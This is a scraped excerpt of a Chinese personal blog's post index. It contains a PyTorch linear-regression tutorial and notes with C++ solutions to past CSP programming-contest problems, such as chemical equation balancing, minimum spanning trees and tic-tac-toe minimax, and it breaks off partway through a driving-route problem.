线性回归模型使用pytorch的简洁实现12345import torchfrom torch import nnimport numpy as nptorch.manual_seed(1)torch.set_default_tensor_type('torch.FloatTensor')\n\n在这里生成数据集跟从零开始的实现中是完全一样的。\n读取数据集1234567891011121314import torch.utils.data as Databatch_size = 10# combine featues and labels of datasetdataset = Data.TensorDataset(features, labels)# put dataset into DataLoaderdata_iter = Data.DataLoader(    dataset=dataset,            # torch TensorDataset format    batch_size=batch_size,      # mini batch size    shuffle=True,               # whether shuffle the data or not    num_workers=2,              # read data in multithreading)\n\n定义模型12345678910class LinearNet(nn.Module):    def __init__(self, n_feature):        super(LinearNet, self).__init__()      # call father function to init         self.linear = nn.Linear(n_feature, 1)  # function prototype: `torch.nn.Linear(in_features, out_features, bias=True)`    def forward(self, x):        y = self.linear(x)        return y    net = LinearNet(num_inputs)\n\n12345678910111213141516171819#这里介绍初始化多层网络的三种方法# ways to init a multilayer network# method onenet = nn.Sequential(    nn.Linear(num_inputs, 1)    # other layers can be added here    )# method twonet = nn.Sequential()net.add_module('linear', nn.Linear(num_inputs, 1))# net.add_module ......# method threefrom collections import OrderedDictnet = nn.Sequential(OrderedDict([          ('linear', nn.Linear(num_inputs, 1))          # ......        ]))\n\n初始化模型参数1234from torch.nn import initinit.normal_(net[0].weight, mean=0.0, std=0.01)init.constant_(net[0].bias, val=0.0)  # or you can use `net[0].bias.data.fill_(0)` to modify it directly\n\n定义损失函数12loss = nn.MSELoss()    # nn built-in squared loss function                       # function prototype: `torch.nn.MSELoss(size_average=None, reduce=None, reduction='mean')`\n\n定义优化函数1234import torch.optim as optimoptimizer = optim.SGD(net.parameters(), lr=0.03)   # built-in random gradient descent functionprint(optimizer)  # function prototype: `torch.optim.SGD(params, lr=, momentum=0, dampening=0, weight_decay=0, nesterov=False)`\n\n输出：\n12345678SGD (Parameter Group 0    dampening: 0    lr: 0.03    momentum: 0    nesterov: False    weight_decay: 0)\n\n训练123456789num_epochs = 3for epoch in range(1, num_epochs + 1):    for X, y in data_iter:        output = net(X)        l = loss(output, y.view(-1, 1))        optimizer.zero_grad() # reset gradient, equal to net.zero_grad()        l.backward()        optimizer.step()    print('epoch %d, loss: %f' % (epoch, l.item()))\n\n输出：\n123epoch 1, loss: 0.000391epoch 2, loss: 0.000126epoch 3, loss: 0.000064\n\n看结果：\n1234# result comparisiondense = net[0]print(true_w, dense.weight.data)print(true_b, dense.bias.data)\n\n输出：\n12[2, -3.4] tensor([[ 1.9996, -3.3994]])4.2 tensor([4.1994])","thumbnail":"https://s2.ax1x.com/2020/02/13/1LCri4.png","plink":"https://yuyuoo.github.io/2020/02/13/pytorch笔记一：线性回归/"},{"title":"csp刷题笔记（第3-4题）","date":"2020-02-10T06:55:10.000Z","date_formatted":{"ll":"Feb 10, 2020","L":"02/10/2020","MM-DD":"02-10"},"updated":"2020-09-10T09:00:28.438Z","content":"201912-3 化学方程式题目：\n\n化学方程式，也称为化学反应方程式，是用化学式表示化学反应的式子。给出一组化学方程式，请你编写程序判断每个方程式是否配平（也就是方程式中等号左右两边的元素种类和对应的原子个数是否相同）。\n本题给出的化学方程式由大小写字母、数字和符号（包括等号 =、加号 +、左圆括号和右圆括号）组成，不会出现其他字符（包括空白字符，如空格、制表符等），化学方程式的格式与化学课本中的形式基本相同（化学式中表示元素原子个数的下标用正常文本，如 H2O 写成 H2O），用自然语言描述如下：\n化学方程式由左右两个表达式组成，中间用一个等号三连接，如 2H2+O2=2H2O；表达式由若干部分组成，每部分由系数和化学式构成，部分之间用加号 + 连接，如 2H2+O2、2H2O；系数是整数或空串，如为空串表示系数为 1；整数由一个或多个数字构成；化学式由若干部分组成，每部分由项和系数构成，部分之间直接连接，如 H2O、CO2、Ca (OH) 2、Ba3 (PO4) 2；项是元素或用左右圆括号括起来的化学式，如 H、Ca、(OH)、(P04)；元素可以是一个大写字母，也可以是一个大写字母跟着一个小写字母，如 H、O、Ca。\n输入\n\n从标准输入读入数据。\n输入的第一行包含一个正整数 n，表示输入的化学方程式个数。\n接下来 n 行，每行是一个符合定义的化学方程式。\n\n输出\n\n输出到标准输出。\n输出共 n 行，每行是一个大写字母 Y 或 N，回答输入中相应的化学方程式是否配平。\n\n输入样例 1\n\n11  \nH2+O2=H2O2H2+O2=2H2OH2+Cl2=2NaClH2+Cl2=2HClCH4+2O2=CO2+2H2OCaCl2+2AgNO3=Ca(NO3)2+2AgCl3Ba(OH)2+2H3PO4=6H2O+Ba3(PO4)23Ba(OH)2+2H3PO4=Ba3(PO4)2+6H2O4Zn+10HNO3=4Zn(NO3)2+NH4NO3+3H2O4Au+8NaCN+2H2O+O2=4Na(Au(CN)2)+4NaOHCu+As=Cs+Au\n\n输出样例 1\n\nN  \nYN  \nYY  \nYY  \nYY  \nYN\n\n解题思路\n首先要清楚系数出现位置的三种情况：\n 1、整个化学式的首部\n 2、元素的右部\n 3、右括号的右部\n 如 32Ba ((OH) 2 (CO3) 2) 3（暂不考虑化学式的合法性）\n 我们从系数入手，在第一种情况下，该系数作用于化学式中的所有元素；在第二种情况下，该系数作用于紧接着的左边的元素；在第三种情况下，该系数作用于紧接着的左边的匹配括号里的所有元素，请通过上例理解。\n 为此，我们考虑使用一个数组将化学式的各部分存储起来 arr，实现逻辑如下：\n 1、顺序遍历化学式\n 2、计算系数的第 1 种情况，也就是整个化学式的系数 factor，继续遍历。\n 3、遇到左或右括号时，将左或右括号加入到 arr 中；遇到大写字母时，获取元素名称，将元素名称加入到 arr 中；遇到数字时，不存到 arr 中，根据系数的第 2、3 种情况相应处理（第 1 种情况已经在第二步处理完成）。\n 4、对于系数的第 2 种情况，此时数组 arr 的最后一个元素就是元素名称，系数作用于它即可；对于系数的第 3 种情况，从数组尾部逆序遍历，直到遇到左括号，将系数作用于这个范围中的元素，同时要将这一对匹配括号从数组中删除。\n 至此处理化学式的过程结束。\n 对于整个化学方程式，将其从等号两边分开处理。使用两个 map 分别记录左右两边的元素个数，再进行比较。\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128#include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;cctype&gt;#include&lt;iostream&gt;#include&lt;string&gt;#include&lt;sstream&gt;#include&lt;map&gt;#include&lt;vector&gt;using namespace std;struct Elem&#123; //元素 \tstring name; //名称 \tint num; //个数 \tElem(string _name, int _num): name(_name), num(_num)&#123;&#125;&#125;;//从str的pos位置开始，得到一个数字int toNumber(string str, int &amp;pos)  &#123;  \tint num = 0;\twhile(isdigit(str[pos]))&#123;\t\tnum = num*10 + str[pos]-'0';\t\tpos++;\t&#125;\treturn num; &#125; void calc(string &amp;str, map&lt;string, int&gt; &amp;mp)&#123;\tstringstream ss(str);\tstring item;\t\twhile(getline(ss, item, '+'))   //获取每一个化学式，如 32Ba((OH)2(CO3)2)3     &#123; \t \t\tvector&lt;Elem&gt; arr; //存储化学式的分解序列， 如 Ba、(、(、O、H、)、(、C、O、)、) \t\tint factor = 1; //整个化学式的系数，默认为1 \t\tint i = 0;\t\t\t\tif(isdigit(item[i])) factor = toNumber(item,i); //计算化学式系数\t\t \t\twhile(i &lt; item.size())        &#123;\t\t\tif(isdigit(item[i]))            &#123; //处理数字\t\t\t\tint num = toNumber(item,i);\t\t\t\tif(arr[arr.size()-1].name == \")\")   //序列最后一个元素是右括号，这个数字是后缀                &#123;  \t\t\t\t\tint j = arr.size() - 1;\t\t\t\t\tarr[j].name = \"*\"; //将右括号标记为*，忽略它的存在，防止外层还有括号导致后续左右括号匹配出错\t\t\t\t\twhile(arr[--j].name != \"(\")                    &#123;\t\t\t\t\t\tarr[j].num *= num;\t\t\t\t\t&#125;\t\t\t\t\tarr[j].name = \"*\"; //将左括号标记为*，忽略它的存在 \t\t\t\t&#125;\t\t\t\telse arr[arr.size()-1].num *= num; //序列最后一个元素是元素名称，如H2O\t\t\t&#125;\t\t\telse if(item[i] == '(')   //处理左括号            &#123;  \t\t\t\tarr.push_back(Elem(\"(\", 0));  //括号加入到序列中\t\t\t\ti++;\t\t\t&#125;\t\t\telse if(item[i] == ')')   //处理右括号            &#123; \t\t\t\tarr.push_back(Elem(\")\", 0));  //括号加入到序列中\t\t\t\tif(!isdigit(item[i+1])) item.insert(i+1,\"1\"); //考虑到右括号右边可能不出现数字，补充底数1 \t\t\t\ti++;\t\t\t&#125;\t\t\telse if(isupper(item[i]))    //处理大写字母            &#123; \t\t\t\t//得到元素名称 \t\t\t\tstring name = \"\";\t\t\t\tname += item[i]; //大写字目 \t\t\t\ti++;\t\t\t\tif(islower(item[i]))    //小写字母                &#123;  \t\t\t\t\tname += item[i];\t\t\t\t\ti++;\t\t\t\t&#125;\t\t\t\tarr.push_back(Elem(name,1)); //名称加入到序列中 \t\t\t&#125;\t\t&#125;\t\t\t\tfor(int i = 0; i != arr.size(); ++i)    //将“元素-&gt;个数”保存到map中         &#123; \t\t\tif(arr[i].name == \"*\") continue; //忽略序列中括号的存在 \t\t\tmp[arr[i].name] += arr[i].num * factor;\t\t&#125;\t\t\t&#125;\t&#125;//判断两个map是否相同bool judge(map&lt;string, int&gt; &amp;left, map&lt;string, int&gt; &amp;right) &#123;  \tif(left.size() != right.size())         return false;\tfor(map&lt;string, int&gt;::iterator it = left.begin(); it != left.end(); ++it)    &#123;\t\tif(right[it-&gt;first] != it-&gt;second)  //比较同一个字母的num在左右两边是否一样，访问num有两种方式            return false;\t&#125;\treturn true;&#125;int main()&#123;\tint n;\tscanf(\"%d\", &amp;n);\tfor(int i = 0; i &lt; n; ++i)    &#123;\t\tmap&lt;string, int&gt; left, right;\t\tstring str, lstr, rstr;\t\tcin&gt;&gt;str;\t\tstringstream ss(str);\t\tgetline(ss, lstr,'='); //得到等号左边的字符串 \t\tgetline(ss, rstr); //得到等号右边的字符串 \t\t\tcalc(lstr, left); //计算左字符串 \t\tcalc(rstr, right);\t\t\t\tif(judge(left, right)) cout&lt;&lt;\"Y\"&lt;&lt;endl;\t\telse cout&lt;&lt;\"N\"&lt;&lt;endl; \t&#125;\treturn 0;&#125;\n\n部分用法解释：\nC++ 中的 getline（）：getline（）函数的定义如下所示istream&amp; getline ( istream &amp;is , string &amp;str , char delim );​ 2. istream&amp; getline ( istream &amp;is , string &amp;str );is 进行读入操作的输入流str 用来存储读入的内容delim 终结符，遇到该字符停止读取操作，不写的话默认为回车。代码里用到getline(ss, item, &#39;+&#39;)，ss的定义是stringstream ss(str)，item是string item，这里的str是整个的等号左边或右边的式子，转成输入流，按加号分隔读入item。访问map第二个元素的两种方式，一个是A[B]，一个是迭代器的second指针，这里在比较左右两边的某个元素是否个数相同时，用if(right[it-&gt;first] != it-&gt;second)。这里it-&gt;first是等号左边某个元素，right[it-&gt;first]访问到这个元素在右边的num，接着it-&gt;second是左边这个元素的num，比较是否相等即可。201909-4 推荐系统题目\n\n某电商有编号为 0 到 m-1 的 m 类商品，包括家电、汽车、电动车、面包、化妆品等。对于每个 app 新用户，每类商品初始有编号不同的 n 个商品，包括各个商家、品牌、供应商等。在任何时刻，同类的任意两个商品的编号各不相同，不同类的任意两个商品的编号可能相同。app 会给每个商品打分。初始时，各类商品的编号和得分都相同。在用户使用 app 时，会产生有效信息，包括喜欢、不喜欢等。app 会根据这些信息，在某类商品增加或删除商品。app 每次会推荐一部分商品给用户看。一个简单的想法是，选出各类所有商品中得分最大的若干商品。该方法虽然简单，但是如果某类商品可能得分特别高，这种简单想法就无法保证推荐商品的多样性。因此，app 查询得分最大的若干商品，同时限制各类商品个数不能超过一个阅值。将上述过程抽象成 3 中操作：操作 1、2、3，分别对应增加、删除、查询操作：1 type commodity score 表示在 type 类商品中增加编号为 commodity 的商品，该商品分数为 score\n2 type commodity 表示在 type 类商品中删除编号为 commodity 的商品。3 k k_0 k_1 k_{m-1} 表示在各类所有商品中选出不超过 K 个（不一定要达到 K 个）得分最大的商品，同时第 i（0&lt;=i&lt;m）类商品的个数不超过 k_i。在查询时，如果第 a（0&lt;=a&lt;m）类商品中编号为 b 的商品和第 A（0&lt;=A&lt;m）类商品中编号为 B 的商品得分相同：1，当 a=A 时，选取编号为 min（b，B）的商品；2，当 a≠A 时，选取第 min（a，A）类商品。\n\n输入\n\n从标准输入读入数据。输入的第一行包含两个正整数 m 和 n，保证 n&lt;=3x10^4 和 m&lt;=50.接下来 n 行，每行两个正整数 id 和 score。第 1+j（1&lt;=j&lt;=n）行表示所有 m 类商品的第 j 个商品的编号和得分。接下来一行包含一个正整数 opnum，表示操作总数，保证 n&lt;=10^5。其中，查询操作一共有 opask 个，保证 opask &lt;= 10^2.接下来 opnum 行，每行若干个正整数，格式对应 1 type commodity score、2\ntype commodity、3 K k_0 k_1 … k_{m-1}，其中，K&lt;=10^2，k_0 k_1 … k_{m-1}&lt;=10^5.\n\n输出\n\n输出到标准输出。输出共 opask×m，对应 opask 个查询操作。第 r×m+c，0&lt;=r&lt;opask，1&lt;=c&lt;=m 行表示，在第 r 个查询操作中，第 c 类商品选出的商品编号，同类商品的编号从小到大输出。如果 r 个查询操作中，第 c 类商品没有选出任何商品，则该行输出 - 1\n\n输入样例\n\n2 31 32 23 18  \n3 100 1 11 0 4 31 0 5 13 10 2 23 10 1 12 0 13 2 1 13 1 1 1\n\n输出样例\n\n1  \n11 41 21  \n14  \n14  \n-1\n\n测试点\n\n解题思路\n\n灵活使用容器 set设计商品信息结构，用来存储商品的类型、编号和得分。设计删除信息结构，用来存储将要删除的商品的类型和编号。考虑到题目输出有序且执行大量查询操作，使用 set 来存储数据。同时为了提高效率，实行惰性删除，即删除仅仅是指标记一个元素被删除，而不是整个清除它。在后续查询时先到Del中查看，如果在说明已被删除，直接跳过。不在的话就被选中，加入chosen[]。chose[]是容器vector。chose[i]是第i类选中的商品的编号，可能有好几个int，打印时用迭代器it指向chose[i]，输出*it会自动在几个数字间加空格。\n参考代码：\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139#include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;set&gt;#include&lt;vector&gt;using namespace std;struct Goods&#123; //商品信息 \tint type;\tint id;\tint score;\tGoods(int _type, int _id, int _score)    &#123;\t\ttype=_type; id=_id; score=_score;\t&#125;\t\tbool operator &lt; (const Goods &amp;rhs) const&#123;\t\tif(score == rhs.score)        &#123;\t\t\tif(type == rhs.type)    //同类同分数，选择编号小的            &#123;                return id &lt; rhs.id;            &#125;            return type &lt; rhs.type; //不同类，选择类型数字小的\t\t&#125;\t\treturn score &gt; rhs.score;\t&#125;&#125;;struct Del&#123;\t//已删除的商品信息 \tint type;\tint id;\t\tDel(int _type, int _id)    &#123;\t\ttype=_type; id=_id;\t&#125;\t\tbool operator &lt; (const Del &amp;rhs) const&#123;\t\tif(type == rhs.type) return id &lt; rhs.id;\t\treturn type &lt; rhs.type;\t&#125;&#125;; set&lt;Goods&gt; goods; //存放所有商品信息 set&lt;Del&gt; has_del; //存放所有已删除的商品信息 //全部设全局int m, n;int id, score;int opnum;int type;int K, k[52]; //k[i]:第i类商品中可选的最多个数int cnt[52]; //计数，cnt[i]：第i类商品中已选数目， cnt[51]已选总数 vector&lt;int&gt; chosen[52]; //输出每类选中的商品的编号 int main()&#123;\tscanf(\"%d%d\", &amp;m, &amp;n);\tfor(int i = 0; i &lt; n; ++i)    &#123;\t\tscanf(\"%d%d\", &amp;id, &amp;score);\t\tfor(int j = 0; j &lt; m; ++j)        &#123;\t\t\tgoods.insert(Goods(j, id, score));\t\t&#125;\t&#125;\tscanf(\"%d\", &amp;opnum);\tint op; //操作类型\tfor(int i = 0; i &lt; opnum; ++i)    &#123;\t\tscanf(\"%d\", &amp;op);\t\tif(op == 1) //添加操作         &#123; \t\t\tscanf(\"%d%d%d\", &amp;type, &amp;id, &amp;score);\t\t\tgoods.insert(Goods(type, id, score));\t\t&#125;\t\telse if(op == 2) //删除操作        &#123;  \t\t\tscanf(\"%d%d\", &amp;type, &amp;id);\t\t\thas_del.insert(Del(type, id)); //将该商品加入删除表中，实行惰性删除 \t\t&#125;\t\telse //查询操作         &#123; \t\t\tscanf(\"%d\", &amp;K);\t\t\tfor(int j = 0; j &lt; m; ++j)            &#123;\t\t\t\tscanf(\"%d\", &amp;k[j]);\t\t\t&#125;\t\t\t\t\t\tmemset(cnt, 0, sizeof(cnt));    //cnt清0\t\t\tfor(int j = 0; j &lt; m; ++j)            &#123;                chosen[j].clear();            &#125;\t\t\t\t\t\t//搜索开始！ \t\t\tfor(set&lt;Goods&gt;::iterator it=goods.begin(); cnt[51]&lt;K &amp;&amp; it!=goods.end();)            &#123;\t\t\t\t//该类商品未选满，查看该商品是否已删除 \t\t\t\tif(cnt[(*it).type]&lt;k[(*it).type])                &#123;  \t\t\t\t\tif(has_del.find(Del((*it).type, (*it).id))!=has_del.end()) //存在于删除表中                     &#123; \t\t\t\t\t\tgoods.erase(it++); //删除该元素，迭代器自增 \t\t\t\t\t&#125;\t\t\t\t\t//未删除 \t\t\t\t\telse                    &#123;\t\t\t\t\t\t++cnt[(*it).type];\t\t\t\t\t\t++cnt[51];\t\t\t\t\t\tchosen[(*it).type].push_back((*it).id); \t\t\t\t\t\tit++;\t\t\t\t\t&#125; \t\t\t\t&#125;\t\t\t\telse it++; \t\t\t&#125;\t\t\t\t\t\t//输出！\t\t\tfor(int j = 0; j &lt; m; ++j)            &#123;\t\t\t\tif(cnt[j] == 0)                    printf(\"-1\\n\");\t\t\t\telse                &#123;\t\t\t\t\tfor(vector&lt;int&gt;::iterator it=chosen[j].begin();it!=chosen[j].end(); ++it)                    &#123;\t\t\t\t\t\tprintf(\"%d \", *it);\t\t\t\t\t&#125;\t\t\t\t\tprintf(\"\\n\");\t\t\t\t&#125;\t\t\t&#125; \t\t\t\t\t&#125;\t&#125; \t\treturn 0;&#125;\n\n部分用法解释：\nmemset ()函数memset ()函数原型是 extern void *memset (void *buffer, int c, int count)buffer：为指针或是数组，c：是赋给 buffer 的值，count：是 buffer 的长度。如：memset (buffer, 0, sizeof (buffer))memset ()用来对一段内存空间全部设置为某个字符，一般用在对定义的字符串进行初始化为‘ ’或‘/0’；例: char a [100]; memset (a, ‘/0’, sizeof (a));201812-4 数据中心题目\n\n\n样例输入\n\n4  \n51  \n1 2 31 3 41 4 52 3 83 4 2\n\n样例输出\n\n4\n\n样例说明\n　　下图是样例说明。\n\n\n题目大意\n\n给你一个由一些顶点、边、权值组成的无向连通图，从这个无向连通图中可以画出多种生成树，输入里指定根结点，最终要找到一种生成树画法，满足：1、所有结点都与根结点连通2、该树的处于同一深度上的边的最大权值记为 Th3、该树的所有深度上的 Th 的最大值记为 Tmax4、Tmax 是所有树结构中 Tmax 的最小值\n\n解题思路\n\n最终的Tmax是所有生成树的结构中Tmax最小的，所以尽量规避权重长的边被包括到树中，最终的树就是最小生成树。要输出的最小生成树的Tmax。\n\n参考代码\n12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576#include&lt;iostream&gt;#include&lt;vector&gt;#include&lt;queue&gt;#define MAXN 50005using namespace std;struct Edge&#123;    int v,u,t;    bool operator &lt; (const Edge &amp;e) const &#123; //默认优先队列是大顶堆，这里指定排序方式，改为根据t排序的小顶堆        return t &gt; e.t;    &#125;&#125;;vector&lt;Edge&gt; adj[MAXN]; //adj[v]:与顶点v相连的边priority_queue&lt;Edge&gt; pq;    //优先队列，默认是大顶堆，存放已经访问过的结点的邻边vector&lt;Edge&gt; mst;   //最小生成树bool vis[MAXN];   //访问标志void Prim();void visit(int v);  //设置访问标志，并将与v相邻结点（未被访问）的边加入优先队列中void Prim() &#123;    visit(1);   //1号结点加入vis，与1相连的边加入pq    while(!pq.empty())    &#123;        Edge e = pq.top();  //最短边        pq.pop();        if(vis[e.v] &amp;&amp; vis[e.u])            continue;        mst.push_back(e);   //新的边加入最小生成树        if(!vis[e.v])            visit(e.v);        if(!vis[e.u])            visit(e.u);    &#125;&#125;void visit(int v)&#123;    vis[v] = true;    for(vector&lt;Edge&gt;::iterator i=adj[v].begin(); i!=adj[v].end();i++)    &#123;        if(!vis[(*i).u])        &#123;            pq.push(*i);        &#125;    &#125;&#125;int main()&#123;    int n,m,root;    int v,u,t;    Edge e;    cin &gt;&gt; n &gt;&gt; m &gt;&gt; root;    for(int i = 0;i &lt; m;i++)    &#123;        cin&gt;&gt;v&gt;&gt;u&gt;&gt;t;        e.v = v;        e.u = u;        e.t = t;        adj[v].push_back(e);        e.v = u;        e.u = v;    //双向边        adj[u].push_back(e);    &#125;    Prim(); //建最小生成树    int TMAX = 0;    for(vector&lt;Edge&gt;::iterator i=mst.begin(); i!=mst.end(); i++)    &#123;        TMAX = TMAX &gt; (*i).t ? TMAX : (*i).t;   //选最大的T    &#125;    cout &lt;&lt; TMAX &lt;&lt; endl;    return 0;&#125;\n\n代码解释：\n这里虽然说n &lt; 5 x 10^4，但是如果MAXN设成50000，得分只有70，设成50005就可以了。priority_queue&lt;Edge&gt; pq是优先队列，这里用默认声明方式，是大顶堆，不遵循先入先出，是根据权重出队列。如果这里的Edge是int，那么就是大的数字先出队列。这里在声明Edge时重载了小于号，并指定是t &gt; e.t，也就是改为t越小的先出队列。所以后面在普利姆算法部分pq.top是权重最小的边。201809-3 元素选择器一个字符串处理题，写一下心得。\n使用stringstream来使接收的一整行字符串按空格分割逐个处理。1234getline(cin,html);stringstream ss(html);string str;ss &gt;&gt; str;  //str获取字符串空格前的部分\n\n​        如果要一直将这行字符串进行按空格分割，逐部分处理，并直到结束，使用while循环\n123456stringstream ss(css);string str;while(ss &gt;&gt; str)    //存储查询条件&#123;\t…………&#125;\n\nstring str.substr()函数有两种用法：123string s = “0123456789”string sub1 = s.substr (5); // 只有一个数字 5 表示从下标为 5 开始一直到结尾：sub1 = “56789”string sub2 = s.substr (5, 3); // 从下标为 5 开始截取长度为 3 位：sub2 = “567”\n\nvector&lt;string&gt; :: reverse_iterator it = query.rbegin(); //反向迭代器反向迭代器加1其实是倒着往前移：123456789101112131415161718192021#include &lt;iostream&gt;#include &lt;iterator&gt;#include &lt;vector&gt;using namespace std;int main() &#123;    //创建并初始化一个 vector 容器    vector&lt;int&gt; myvector&#123; 1,2,3,4,5,6,7,8 &#125;;    //创建并初始化一个反向迭代器    vector&lt;int&gt; :: reverse_iterator my_reiter = myvector.rbegin();    cout &lt;&lt; *my_reiter &lt;&lt; endl;// 8    cout &lt;&lt; *(my_reiter + 3) &lt;&lt; endl;// 5    cout &lt;&lt; *(++my_reiter) &lt;&lt; endl;// 7    cout &lt;&lt; my_reiter[4] &lt;&lt; endl;// 3    return 0;&#125;程序执行结果为：8573\n\n201803-3 URL 映射笔记\nC++ push 方法与 push_back 方法：push_back()：将一个新的元素加到 vector 的最后面push()：stack::push ();// 在栈顶增加元素queue::push();// 将 x 接到队列的末端strchr()：char *strchr(const char *str, int c)在参数 str 所指向的字符串中搜索第一次出现字符 c（一个无符号字符）的位置，若没有这个字符返回NULL12if(strchr(rule+j,'/') != NULL)  //从rule+j开始往后第一个出现/的地方    j = strchr(rule+j,'/') - rule;\n\n\nstrstr()：strstr (str1,str2) 函数用于判断字符串 str2 是否是 str1 的子串。如果是，则该函数返回 str2 在 str1 中首次出现的地址；否则，返回 NULL。c_str()：作用是 string--&gt;char*1printf(\"%s \",value[j].c_str());\t//value[j]是string，转成char*\n\n201803-4 棋局评估题目\n\nAlice 和 Bob 正在玩井字棋游戏。井字棋游戏的规则很简单：两人轮流往 3*3 的棋盘中放棋子，Alice 放的是 “X”，Bob 放的是 “O”，Alice 执先。当同一种棋子占据一行、一列或一条对角线的三个格子时，游戏结束，该种棋子的持有者获胜。当棋盘被填满的时候，游戏结束，双方平手。Alice 设计了一种对棋局评分的方法：- 对于 Alice 已经获胜的局面，评估得分为 (棋盘上的空格子数 + 1)；- 对于 Bob 已经获胜的局面，评估得分为 -(棋盘上的空格子数 + 1)；- 对于平局的局面，评估得分为 0；\n\n\n例如上图中的局面，Alice 已经获胜，同时棋盘上有 2 个空格，所以局面得分为 2+1=3。由于 Alice 并不喜欢计算，所以他请教擅长编程的你，如果两人都以最优策略行棋，那么当前局面的最终得分会是多少？\n\n输入\n\n输入的第一行包含一个正整数 T，表示数据的组数。每组数据输入有 3 行，每行有 3 个整数，用空格分隔，分别表示棋盘每个格子的状态。0 表示格子为空，1 表示格子中为 “X”，2 表示格子中为 “O”。保证不会出现其他状态。保证输入的局面合法。(即保证输入的局面可以通过行棋到达，且保证没有双方同时获胜的情况)保证输入的局面轮到 Alice 行棋。\n\n输出\n\n对于每组数据，输出一行一个整数，表示当前局面的得分。\n\n输入样例\n\n3  \n1 2 12 1 20 0 02 1 10 2 10 0 20 0 00 0 00 0 0\n\n输出样例\n\n3  \n-40\n\n样例说明\n\n第一组数据：Alice 将棋子放在左下角 (或右下角) 后，可以到达问题描述中的局面，得分为 3。3 为 Alice 行棋后能到达的局面中得分的最大值。第二组数据：\n\nBob 已经获胜 (如图)，此局面得分为 -(3+1)=-4。第三组数据：井字棋中若双方都采用最优策略，游戏平局，最终得分为 0。\n\n数据规模和约定\n对于所有评测用例，1 ≤ T ≤ 5。\n参考代码\n1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#include&lt;iostream&gt;#include&lt;string.h&gt;#include&lt;algorithm&gt;#define INF 0X3F3F3F3Fusing namespace std;int arr[3][3];  //1 Alice &amp;&amp; 2 Bob//判断玩家V是否获胜bool judge(int v)&#123;    for(int i = 0;i &lt; 3;i++)    &#123;        if(arr[i][0] == v &amp;&amp; arr[i][1] == v &amp;&amp; arr[i][2] == v)  //连成一行            return true;        if(arr[0][i] == v &amp;&amp; arr[1][i] == v &amp;&amp; arr[2][i] == v)  //连成一列            return true;    &#125;    //对角线    if(arr[0][0] == v &amp;&amp; arr[1][1] == v &amp;&amp; arr[2][2] == v)        return true;    if(arr[0][2] == v &amp;&amp; arr[1][1] == v &amp;&amp; arr[2][0] == v)        return true;    return false;&#125;int dfs(int v)&#123;    int count = 0;    for(int i = 0;i &lt; 3;i++)    //计算空格数    &#123;        for(int j = 0;j &lt; 3;j++)        &#123;            if(arr[i][j] == 0)                count++;        &#125;    &#125;    if(v == 1 &amp;&amp; judge(2))  return -count-1;    //轮到Alice，但当前局面Bob已经获胜    if(v == 2 &amp;&amp; judge(1))  return count+1;     //轮到Bob，但当前局面Alice已经获胜    if(count == 0) return 0;    //平局    int mn = INF, mx = -INF;    //初始化最大值和最小值    for(int i = 0;i &lt; 3;i++)    &#123;        for(int j = 0;j &lt; 3;j++)        &#123;            if(arr[i][j] == 0)            &#123;                arr[i][j] = v; //填充空格                if(v == 1) mx = max(mx,dfs(2)); //alice选择下一步最优的解                if(v == 2) mn = min(mn,dfs(1));                arr[i][j] = 0; //恢复当前局面，尝试填充下一个空格            &#125;        &#125;    &#125;    //当前局面无获胜    if(v == 1) return mx;    if(v == 2) return mn;&#125;int main()&#123;    int T;    cin &gt;&gt; T;    while(T--)    &#123;        for(int i = 0;i &lt; 3;i++)        &#123;            for(int j = 0;j &lt; 3;j++)            &#123;                cin &gt;&gt; arr[i][j];            &#125;        &#125;        cout &lt;&lt; dfs(1) &lt;&lt; endl;    &#125;    return 0;&#125;\n\n代码解释：\n用max()和min()函数要引用头文件#include&lt;algorithm&gt;双方都遵循最优策略，所以不管是A还是B，每下一步都深度优先搜索，看这一步会不会取得得分最大值。201712-3 Crontab笔记：\n根据年月日得到是星期几的函数isdigit(str[i])判断是不是数字，isalpha(str[i])判断是不是字母，头文件ctype.hunique()：头文件要加#include &lt;algorithm&gt;返回的是 a 去重后的尾地址，不真正把重复的元素删除，其实是把重复的元素移到后面去了，然后依然保存到了原数组中，然后返回去重后最后一个元素的地址，因为 unique 去除的是相邻的重复元素，所以一般用之前都会要排一下序，a 必须是有序的。201712-4 行车路线题目\n\n小明和小芳出去乡村玩，小明负责开车，小芳来导航。小芳将可能的道路分为大道和小道。大道比较好走，每走 1 公里小明会增加 1 的疲劳度。小道不好走，如果连续走小道，小明的疲劳值会快速增加，连续走 s 公里小明会增加 s2 的疲劳度。例如：有 5 个路口，1 号路口到 2 号路口为小道，2 号路口到 3 号路口为小道，3 号路口到 4 号路口为大道，4 号路口到 5 号路口为小道，相邻路口之间的距离都是 2 公里。如果小明从 1 号路口到 5 号路口，则总疲劳值为 (2+2)2+2+22=16+2+4=22。现在小芳拿到了地图，请帮助她规划一个开车的路线，使得按这个路线开车小明的疲劳度最小。\n\n输入\n\n输入的第一行包含两个整数 n, m，分别表示路口的数量和道路的数量。路口由 1 至 n 编号，小明需要开车从 1 号路口到 n 号路口。接下来 m 行描述道路，每行包含四个整数 t, a, b, c，表示一条类型为 t，连接 a 与 b 两个路口，长度为 c 公里的双向道路。其中 t 为 0 表示大道，t 为 1 表示小道。保证 1 号路口和 n 号路口是连通的。\n\n输出\n\n输出一个整数，表示最优路线下小明的疲劳度。\n\n样例输入\n\n6 71 1 2 31 2 3 20 1 3 300 3 4 200 4 5 301 3 5 61 5 6 1\n\n样例输出\n\n76\n\n样例说明\n\n从 1 走小道到 2，再走小道到 3，疲劳度为 52=25；然后从 3 走大道经过 4 到达 5，疲劳度为 20+30=50；最后从 5 走小道到 6，疲劳度为 1。总共为 76。\n\n数据规模和约定\n\n对于 30% 的评测用例，1 ≤ n ≤ 8，1 ≤ m ≤ 10；对于另外 20% 的评测用例，不存在小道；对于另外 20% 的评测用例，所有的小道不相交；对于所有评测用例，1 ≤ n ≤ 500，1 ≤ m ≤ 105，1 ≤ a, b ≤ n，t 是 